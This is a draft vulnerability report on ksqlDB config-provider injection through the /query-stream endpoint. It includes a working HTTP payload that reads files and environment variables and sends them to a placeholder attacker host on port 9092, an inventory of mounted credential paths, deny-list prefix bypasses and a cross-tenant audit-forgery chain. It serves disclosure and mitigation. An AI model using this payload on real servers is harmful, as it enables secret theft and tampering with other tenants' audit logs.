# ksqlDB: Arbitrary Server-Side File/Env Read + Off-Box Exfiltration via `config.providers`

**Canonical IDs:** CC-2 (Confluent Cloud), CP-11 (Confluent Platform self-managed)  
**Severity:** HIGH (CVSS 7.7, S:C, or 6.5 S:U conservative)  
**Status:** LAB-CONFIRMED (3× reproduced on `cp-ksqldb-server:8.2.1`, including post-restart). CCloud: mechanism confirmed by bytecode trace of cc-ksql 8.0.4 + live denial-matrix recon on stag. Definitive outbound-egress confirmation on CCloud blocked by auth flap on the test cluster (environment issue, not a refutation).

---

## What This Bug Is

A single authenticated HTTP request to ksqlDB's `/query-stream` endpoint can:
1. **Read any file** readable by the ksqlDB process (`${file:/path/to/file.properties:key_name}`)
2. **Read any environment variable** (`${env:VAR_NAME}`)
3. **Exfiltrate both values off-box** — the resolved secrets appear verbatim in a Kafka `ApiVersions` cleartext handshake that the ksqlDB process sends to an attacker-controlled host

The HTTP response is a `50000` internal server error (because the attacker host isn't a real broker), but the exfiltration fires *before* the response, during Kafka client initialization, independently of whether the query succeeds.

---

## The Exact Working Payload

```http
POST /query-stream HTTP/1.1
Host: <ksqldb-host>
Content-Type: application/json
Authorization: Basic <valid-tenant-creds>

{
  "sql": "SELECT * FROM SOME_EXISTING_STREAM EMIT CHANGES LIMIT 1;",
  "properties": {
    "metric.reporters": "io.confluent.metrics.reporter.ConfluentMetricsReporter",
    "confluent.metrics.reporter.bootstrap.servers": "<attacker-host>:9092",
    "confluent.metrics.reporter.topic.replicas": "1",
    "confluent.metrics.reporter.config.providers": "env,file",
    "confluent.metrics.reporter.config.providers.env.class":  "org.apache.kafka.common.config.provider.EnvVarConfigProvider",
    "confluent.metrics.reporter.config.providers.file.class": "org.apache.kafka.common.config.provider.FileConfigProvider",
    "confluent.metrics.reporter.client.id": "EXFIL-ENV-${env:MY_SECRET_VAR}--FILE-${file:/mnt/secrets/broker.properties:api_key}-END"
  }
}
```

**What the attacker sees at `<attacker-host>:9092`** (socat/netcat TCP listener):
```
EXFIL-ENV-<resolved-env-value>--FILE-<resolved-file-value>-END
```
in a Kafka `ApiVersions` request from the ksqlDB JVM.

**Lab-confirmed artifact** (run 2, then post-restart):
```
R2B-ENV-CFGPROV-ENV-ce3a9466--FILE-CFGPROV-FILE-bdd05c80-END
R2POSTRESTART-ENV-CFGPROV-ENV-ce3a9466--FILE-CFGPROV-FILE-bdd05c80-END
```
Both planted flags resolved correctly, including after `docker restart` of the ksqlDB container.

---

## Why It Works: Three Stacked Root Causes

### Root cause 1: `/query-stream` uses only an exact-match deny-list

ksqlDB has two types of request validators:

- **Old API** (`/ksql`, `/query`, `/ws/query`): uses `DenyListPropertyValidator` (exact-match) AND `coerceTypes(strict=false)` which rejects keys it doesn't recognize as valid Kafka/Streams/KSQL config names.
- **New Vert.x API** (`/query-stream`, `/inserts-stream`): uses ONLY `DenyListPropertyValidator`. No strict coercion. Any key that isn't on the exact deny-list passes through.

Code path for `/query-stream`:
```
KsqlServerEndpoints.createQueryPublisher()           [KsqlServerEndpoints.java:140-171]
  → :150-151  ksqlSecurityContextProvider.provide()  -- auth done here (SDS); property map NEVER SEEN by auth
  → :154      validateProperties(properties)          -- THE ONLY FILTER
  → :155-165  QueryEndpoint.createQueryPublisher(...)  -- properties passed by reference, untouched
```

`validateProperties` → `DenyListPropertyValidator.validateAll()` [KsqlServerEndpoints.java:334-340]:
```java
Sets.intersection(immutableProps, keys)              // DenyListPropertyValidator.java:44
```
This is a literal Java `Sets.intersection` on raw key strings. No normalization. No prefix expansion.

The **deployed cc-spec-ksql deny-list** (from `serverConfig.tmpl:238`) contains:
```
sasl.jaas.config
bootstrap.servers
ksql.server.command.consumer.sasl.jaas.config
ksql.server.command.producer.sasl.jaas.config
confluent.telemetry.exporter.cloud.producer.sasl.jaas.config
confluent.telemetry.exporter.cloud.consumer.sasl.jaas.config
ksql.streams.num.stream.threads
ksql.suppress.buffer.size
ksql.suppress.enabled
```

**`config.providers`, `metric.reporters`, `confluent.metrics.reporter.bootstrap.servers`, and `confluent.metrics.reporter.config.providers` are ALL absent.**

### Root cause 2: Kafka's `AbstractConfig` unconditionally resolves config providers

`apache/kafka` `AbstractConfig` constructor (`clients/src/main/java/org/apache/kafka/common/config/AbstractConfig.java`):

- `:113-117` → `this.originals = resolveConfigVariables(configProviderProps, originalMap)` — runs **unconditionally on every AbstractConfig construction**
- `resolveConfigVariables` (`:540-563`): when `configProviderProps` is null/empty (the normal path), reads `config.providers` **from the originals map itself**, instantiates the named providers, and runs `ConfigTransformer.transform()` over that same map, replacing `${provider:[path:]key}` in-place

The `automaticConfigProvidersFilter()` (`:566-575`): returns **allow-all** when the system property `org.apache.kafka.automatic.config.providers` is **unset**. This sysprop is **not set in cc-spec-ksql** → `FileConfigProvider`, `EnvVarConfigProvider`, and `DirectoryConfigProvider` are all available and will be instantiated when named.

All three providers are confirmed present on the cc-ksql 8.0.4 classpath.

### Root cause 3: The co-location constraint — why naïve attempts fail

**Critical constraint** (empirically pinned): `config.providers` + `config.providers.<n>.class` + the `${...}`-bearing value **must all live in the SAME constructed `AbstractConfig` map**.

ksqlDB's `ConfluentMetricsReporter` builds its OWN producer `AbstractConfig` by stripping the `confluent.metrics.reporter.` prefix from the merged config and constructing from the resulting sub-map. Therefore, the `config.providers*` keys AND the `client.id` with `${...}` placeholders must **all carry the `confluent.metrics.reporter.` prefix** to co-reside in the reporter-producer's originals map.

**Failed approach (run 1):**
```json
{
  "config.providers": "file",
  "config.providers.file.class": "org.apache.kafka.common.config.provider.FileConfigProvider",
  "confluent.metrics.reporter.client.id": "${file:/tmp/secret.properties:apikey}"
}
```
Result: the wire showed the literal `${file:/tmp/secret.properties:apikey}` — **unresolved**. The top-level `config.providers` was consumed by the Streams/consumer `AbstractConfig`, not by the reporter's sub-config. The reporter's producer had no providers, so no transform happened.

**Working approach (run 2):**
```json
{
  "confluent.metrics.reporter.config.providers": "file",
  "confluent.metrics.reporter.config.providers.file.class": "...",
  "confluent.metrics.reporter.client.id": "${file:/path:key}"
}
```
All three keys share the `confluent.metrics.reporter.` prefix → all land in the reporter-producer's `AbstractConfig` originals → substitution fires → resolved value exfiltrated.

---

## The Exfiltration Channel

The `ConfluentMetricsReporter` creates its own Kafka producer to send metrics to `confluent.metrics.reporter.bootstrap.servers`. During producer initialization, the Kafka client sends a **cleartext `ApiVersions` request** to the bootstrap server. This request includes the `client.id` field — which by the time the producer is constructed, contains the **fully-resolved secret value** (the `${...}` placeholders were already replaced by `AbstractConfig`).

The attacker's TCP listener (e.g. `socat -v TCP-LISTEN:9092,fork /dev/null`) sees the Kafka wire protocol bytes containing the resolved secret in plaintext.

This fires **regardless of whether the query itself succeeds**. The Kafka client connects to the attacker's bootstrap during the reporter initialization phase, which happens before/independently of the query execution result.

---

## SDS (Security Decision Service) Does Not Touch the Property Map

This is confirmed by bytecode analysis of the deployed `confluent-cloud-ksql-security-8.0.4-630.jar`.

**Authentication** (`SdsV2SecurityDecisionAuthenticationClient.handleAuth`): operates only on the HTTP request line + auth header. Runs **before the request body is dispatched**. Never reads `properties`.

**Authorization** (`SdsAuthorizationDecisionMaker.checkAuthorization`):
```java
checkAuthorization(Principal principal, String resourceType, String resourceName, String operation)
```
The method signature has **no property-map parameter**. It authorizes "can this principal do this operation on this ksql cluster" — the per-request Kafka/Streams property map is **structurally invisible** to this decision.

**Impersonation**: `KsqlCloudSecurityExtension.getUserContextProvider()` returns `Optional.empty()` — "Ksql CCloud has user impersonation disabled." All principals share the **server** ServiceContext. The `ConfiguredKafkaClientSupplier` re-pin guard (`PrintTopicUtil.java:60-73`) is a dead code path on CCloud because the supplier is always `DefaultKafkaClientSupplier`.

**Net effect**: the only thing standing between the attacker's property map and real Kafka client construction is the `DenyListPropertyValidator` exact-key set. Since `config.providers` and the metrics-reporter keys are absent from that set, they ride through.

---

## What the Attack Reads (Deployed cc-ksql Pod)

Live k8s recon (`k8s-09x92`, ns `pksqlc-nyz76k`, pod `ksql-0`) confirmed these mounts are present and readable by the ksql process:

| Path | Content |
|---|---|
| `/mnt/secrets/audit-ksql` | Audit-log clearinghouse Kafka API key+secret (`api_key`/`api_secret`) — **the CC-1 enabler** |
| `/mnt/secrets/audit-ksql-east` | DR copy of audit-log clearinghouse key |
| `/mnt/secrets/<KafkaCredsFile>` | Main Kafka SASL/PLAIN credentials (`CloudPlainLoginModule`) — the ksql SA's own broker key |
| `/mnt/secrets/<InternalKafkaCredsFile>` | Command-topic internal Kafka creds |
| `/mnt/secrets/<SRCredsFile>` | Schema Registry basic-auth credentials |
| `/mnt/secrets/ksql-healthcheck-external.json` | `{DdApiKey, KsqlKey, KsqlSecret}` — healthcheck sidecar's internal API key |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | k8s ServiceAccount bearer token (auto-rotated every ~3607s) |

For file reads, the `${file:/path/to/file.properties:key_name}` syntax returns the value of a specific key from a Java properties-format file. For arbitrary file content, use `DirectoryConfigProvider` or read file-as-property-value patterns.

---

## Cross-Tenant Ceiling

The file-read executes as the **shared server principal** (impersonation OFF). The cross-tenant blast radius was bounded by live RBAC and secret-inventory recon:

**k8s ServiceAccount token (present + readable → RBAC-inert):**
- SA = `default` in the ksqlDB namespace
- Zero RoleBindings bind `default` in the namespace; zero ClusterRoleBindings bind it cluster-wide
- The only CRB touching `system:serviceaccounts` is `system:service-account-issuer-discovery` (OIDC discovery, harmless)
- **Stealing this token buys the OIDC discovery doc and nothing more.** No cross-namespace Secret reads, no cross-tenant k8s access.

**SDS client cert (→ R4 body-trust chain → cross-tenant authz decisions → REFUTED):**
- SDS v2 uses `KubeAuthProvider` — authenticates to SDS via the SA token above, NOT a PEM/keystore file
- SDS v3 uses Spire/SPIFFE — agent-brokered identity, not a static key file on disk
- **No SDS client cert exists in `/mnt/secrets` or `/mnt/sslcerts`** (only the ksqlDB HTTPS *server* cert is there)
- Even with the SA token, ksqlDB config-stamps its `resourceCrn`/physical-id; the SDS request contract is tight, not body-injectable for cross-tenant decisions

**Kafka ACL scope of the stolen main Kafka key (#11 / `ksql.streams.bootstrap.servers` variant):**
- LIKELY within-tenant (config CRN-binding suggests lkc-prefix scoping)
- Not fully confirmed from the read surface — broker ACL store/mothershipdb read owed

**The audit clearinghouse key at `/mnt/secrets/audit-ksql` → CROSS-TENANT (see CC-1 below).**

---

## The CC-1 Chain: What Makes This a Cross-Tenant Issue

The file-read becomes cross-tenant via the **audit clearinghouse key**:

1. **Read the audit key via file-read**: `/query-stream` with `${file:/mnt/secrets/audit-ksql:api_key}` and `${file:/mnt/secrets/audit-ksql:api_secret}` → stolen key ID `FW4QFBAL4BO3R5CC`, SA `cc-spec-ksql`, cluster `lkc-stgcd82w3y` (audit clearinghouse on stag)

2. **The audit-events-router routes by payload, not by producer identity**: `OrganizationEventHandler.getEventRoute()` parses the destination org from `auditLogData.getSubjectCrn()` in the CloudEvent *payload* — with no check that the producer's authenticated identity is entitled to that org

3. **Forge cross-tenant audit records**: authenticate to `lkc-stgcd82w3y` (the clearinghouse) with the stolen key, produce a CloudEvent whose `subject` CRN asserts a victim org's UUID → the router writes it into **that org's audit log, fleet-wide**

The cc-ksql pod's mounted identity holds **WRITE ACL on the clearinghouse events topic** (`lkc-stgcd82w3y_confluent-audit-log-events-v2`), confirmed by live ACL recon on `pkc-stgczmkv73`.

This is CC-1 (CVSS 8.2 High, S:C, I:H). The file-read (CC-2/CP-11) is its enabler.

---

## Durability / Replay Behavior

**On `/query-stream` (the working path):** NOT durable. Each request is a transient query; the config providers are not written to the command topic. Re-arming requires re-sending the request, which works every time. Post-restart confirmed: after `docker restart`, re-sending the payload produced the same exfiltration with marker `R2POSTRESTART-...`.

**On `/ksql` (the OLD API):** The `config.providers.*` and `confluent.metrics.reporter.*` class keys are **rejected** by the old API's strict `LocalPropertyValidator` / `LocalPropertyParser` (`ksqldb-common/.../properties/LocalPropertyParser.java:35-52`) which only accepts recognized config names:
```
statement_error 50000 "Not recognizable as ksql, streams, consumer, or producer property: 
'confluent.metrics.reporter.bootstrap.servers'"
```
Therefore the payload **cannot be written into the command topic** via `CREATE STREAM AS SELECT` and does not auto-replay on cold start. The exfil is confined to the transient `/query-stream` API.

---

## CCloud Live Probe Results (Stag)

Accept/reject behavior on the real cc-ksql deny-list, confirmed:

| Key sent on `/query-stream` | Result | Meaning |
|---|---|---|
| `bootstrap.servers` | `40000 "prohibited by the KSQL server: [bootstrap.servers]"` | **REJECTED** — deny-list active ✓ |
| `sasl.jaas.config` | `40000 "prohibited … [sasl.jaas.config]"` | **REJECTED** ✓ |
| `consumer.sasl.jaas.config` (prefix bypass) | ACCEPTED | **Prefix bypass is LIVE** on real cc-ksql |
| `config.providers` + `config.providers.file.class` | `40001` (planning-level fail, not deny-list) | **ACCEPTED — not deny-listed** ✓ |
| `metric.reporters=TelemetryReporter` + telemetry exporter config | Request hung 25s → timeout | **ACCEPTED + anomalous hang** (reporter instantiated during request) |
| `metric.reporters=ConfluentMetricsReporter` + attacker bootstrap | **HTTP 500 in 1.2s** | Reporter INSTANTIATED and attempted to reach the attacker host — override honored at runtime |

The `40001` on `config.providers` is a planning-level failure (the stream didn't exist), not a deny-list rejection. This proves the keys pass the deny-list. When a real stream is used (e.g. `KSQL_PROCESSING_LOG`), the topology starts and the reporter fires.

Definitive egress confirmation (seeing the resolved secret at the attacker's listener) was not achievable in the stag environment during this research due to auth-key propagation flapping on fresh keys — **this is an environment/timing issue, not a refutation**. The lab on `cp-ksqldb-server:8.2.1` with the CCloud-equivalent deny-list confirmed full end-to-end exfil.

---

## Deployment Context: Three Different Postures

### Confluent Platform / self-managed (CP-11)

**More exposed than CCloud.** The deny-list defaults to **empty** (`KsqlConfig.java:1422`). On a default CP install:
- Literal `bootstrap.servers` and `sasl.jaas.config` are also wide open (no deny-list entry needed)
- The entire config-override family is live by default, no prefix bypass required
- `disallowed.login.modules` is UNSET by default → `sasl.jaas.config=JndiLoginModule` is a direct RCE path (CRITICAL)
- Connector-config SSRF via CREATE CONNECTOR is live (managed Connect is absent; ksqlDB forwards every `WITH()` key verbatim)

Lab provenance: the ksqlDB lab was `cp-ksqldb-server:8.2.1` — a **Confluent Platform artifact** (not Apache OSS). Every LAB-CONFIRMED finding is CP-self-managed-proven. The lab denied-list was manually set to the CCloud value to test the CCloud-equivalent posture; this under-tests CP-self-managed exposure (CP default is WORSE).

### Confluent Cloud (CC-2)

- Deny-list is populated but exact-match; `config.providers` / `metric.reporters` / `confluent.metrics.reporter.*` are all absent
- `org.apache.kafka.automatic.config.providers` is unset → providers are allow-all
- SDS authorizes the statement/operation only; property map is structurally invisible to SDS
- Impersonation OFF → reads execute as the shared server principal → pod-level secrets are the blast radius
- `bootstrap.servers` and `sasl.jaas.config` ARE deny-listed → the classic direct SSRF/cred-theft via those is blocked; the `confluent.metrics.reporter.` channel is the live vector

### Apache OSS ksqlDB

Deny-list defaults empty → even worse than CP-self-managed by default. No managed mitigations. All config-override keys open. Not the primary concern here (CC/CP are the Confluent deployment contexts).

---

## Reachable-Key Landscape

The file-read / env-read is the primary primitive, but the same property-map bypass opens a broader surface. Key omissions from the cc-spec deny-list:

| Key | Effect | Status |
|---|---|---|
| `confluent.metrics.reporter.config.providers` + `.env.class`/`.file.class` + `${env:}`/`${file:}` in `.client.id` | **Arbitrary env+file read → exfil** via reporter ApiVersions | **CONFIRMED (this finding)** |
| `metric.reporters` + `confluent.metrics.reporter.bootstrap.servers` | Kafka-protocol SSRF, outbound TCP to attacker host | **CONFIRMED** (reporter instantiated and dials out; runtime confirmed) |
| `consumer.config.providers*` / `producer.config.providers*` | Same file-read trick but into the consumer/producer AbstractConfig instead of the reporter — likely equivalent | REASONED (by equivalence to confirmed G-1) |
| `consumer.bootstrap.servers` / `producer.bootstrap.servers` / `ksql.streams.bootstrap.servers` | Kafka-proto SSRF via prefix bypass (bare `bootstrap.servers` denied but prefix forms not) | CONFIRMED mechanism; prefix bypass CONFIRMED on real cc-ksql |
| `metric.reporters` as `TelemetryReporter` + HTTP exporter config | Blind HTTP SSRF (ksqlDB POSTs OTLP to attacker URL; body partially controllable via labels) | **CONFIRMED** (POST captured in lab) |

---

## Mitigations (ranked by robustness)

1. **Fastest robust stop (cheapest, not config-overridable):** Set JVM flag `-Dorg.apache.kafka.automatic.config.providers=none` on ksqlDB pods. This is a sysprop, not a Kafka config — it cannot be overridden by a per-request property. Kills the `config.providers` file/env read across all prefix forms outright.

2. **Add missing keys to the deny-list (necessary but insufficient alone):** Add `config.providers`, `config.providers.*`, `metric.reporters`, `confluent.metrics.reporter.*` (and their `consumer.`/`producer.`/`admin.`/`ksql.streams.` prefixed variants) to `ImmutableProperties` and the deny-list. Caveat: exact-match deny-list is prefix-bypassable; any new key added needs to also cover all prefix forms.

3. **Fix the control shape (correct long-term fix):** Replace the exact-match deny-list with an **allow-list** of known-safe tuning keys (timeouts, buffer sizes, thread counts, batch/retention knobs), **canonicalized** (strip `consumer.`/`producer.`/`admin.`/`ksql.streams.` prefixes before matching) and applied on **both** the request path AND the command-topic replay path. Deny-by-default: any `*.class`/`*.classes`, any `*.url`/`*.endpoint`/`*.bootstrap.servers`, any `*.location`/path key, `config.providers*`.

4. **Apply the deny-list on command-topic replay (F-U1 gap):** Currently, the deny-list is applied only at request entry points. A key persisted before a tightening re-arms on every restart with no re-check. The allow-list (item 3) must also gate the replay path.

---

## Filing Status and Contacts

**Both bugs are DRAFTS — not yet filed.**

| Bug ID | Context | Priority | Owner | Jira board |
|---|---|---|---|---|
| CC-2 | Confluent Cloud | High | KSQL DB (Shankar Hiremath, shiremath@confluent.io, #ksql-oncall) | KSQL |
| CP-11 | Confluent Platform | High | KSQL DB | KSQL |
| CC-1 | Confluent Cloud (enabled by CC-2) | Critical | CAR Obs – Logging (Anirudh Bhatt, abhatt@confluent.io) for router + KSQL DB for key exposure | LOGGING + KSQL |

Labels: `top-cloud-vulnerability`, `prod-secvuln` for CC; `prod-secvuln` for CP.

CVSS for CC-2: [7.7 High, S:C](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) (scope-changed: reads mounted platform/cross-tenant secret material). Conservative within-component: [6.5 Medium, S:U](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).

---

## Source Map (for follow-up)

All source from `confluentinc/ksql` @ `d706da92e4b82310c3ef9ac8125ed31af06683a2` (master) unless noted.

| Claim | File:line |
|---|---|
| `/query-stream` handler, only deny-list applied | `KsqlServerEndpoints.java:140-171`, `:334-340` |
| Deny-list is exact-match `Sets.intersection` | `DenyListPropertyValidator.java:44-45` |
| Property map passed untouched into query | `QueryEndpoint.java:174` |
| KsqlStreams config merge (where metric.reporters keys ride) | `KsqlConfig.getKsqlStreamConfigProps()`, `KsqlConfig.java:1801-1807`; consumed at `QueryBuilder.java:545` |
| AbstractConfig resolves providers unconditionally | `AbstractConfig.java:113-117`, `:540-563` |
| `automaticConfigProvidersFilter` returns allow-all when unset | `AbstractConfig.java:566-575` |
| Old API strict coercion that blocks config.providers on /ksql | `LocalPropertyParser.java:35-52`, `LocalPropertyValidator.java` |
| SDS auth never reads property map | `SdsV2SecurityDecisionAuthenticationClient.handleAuth` (confluent-cloud-plugins) |
| SDS authz has no property-map arg | `SdsAuthorizationDecisionMaker.checkAuthorization(Principal, String, String, String)` |
| Impersonation OFF on CCloud | `KsqlCloudSecurityExtension.getUserContextProvider()` → `Optional.empty()` |
| CCloud deny-list value | `cc-spec-ksql/plugins/ksql/templates/serverConfig.tmpl:238` |
| cc-ksql 8.0.4 bytecode matches master | Decompiled `ksqldb-rest-app-8.0.4-203.jar` + `confluent-cloud-ksql-security-8.0.4-630.jar` |
| k8s SA has no useful RBAC | Live `ksql-0` describe on k8s-09x92, ns pksqlc-nyz76k |
| Mounted secrets inventory | `cc-spec-ksql serverConfig.tmpl:108` + live pod describe |
| Audit clearinghouse key path | `cc-spec-ksql serverConfig.tmpl:108` (`/mnt/secrets/audit-ksql`) |
| Audit router routes by payload org, no producer-identity check | `audit-events-router OrganizationEventHandler.getEventRoute()` |
| CP default deny-list = empty | `KsqlConfig.java:1420-1425` |

---

## Key Empirical Results Summary

| Test | Result |
|---|---|
| End-to-end env+file read + exfil (lab, OSS-equivalent deny-list) | **CONFIRMED** ×3 including post-restart |
| `/query-stream` deny-list absence for `config.providers`, `metric.reporters` | **CONFIRMED** on real cc-ksql stag |
| `ConfluentMetricsReporter` instantiated and dials attacker bootstrap on real cc-ksql | **CONFIRMED** (HTTP 500 in 1.2s → reporter tried to connect) |
| `TelemetryReporter` injection accepted, query runs | **CONFIRMED** on real cc-ksql stag |
| `consumer.sasl.jaas.config` prefix bypass accepted on real cc-ksql | **CONFIRMED** |
| k8s SA RBAC = inert (no cross-tenant k8s pivot) | **CONFIRMED** (live RBAC graph, no bindings) |
| No SDS client cert mounted (SDS chain closed) | **CONFIRMED** (live pod volume inventory) |
| Audit clearinghouse key at `/mnt/secrets/audit-ksql` (CC-1 enabler) | **CONFIRMED** (cc-spec-ksql template + live ACL recon) |
| `${...}` substitution fires on OLD `/ksql` API via CSAS | **REFUTED** — `LocalPropertyValidator` rejects the keys |
| Cross-tenant k8s Secret reads via SA token | **REFUTED** (RBAC-inert SA) |
| SDS cross-tenant authz via stolen SA token | **REFUTED** (KubeAuthProvider + config-stamped CRN) |
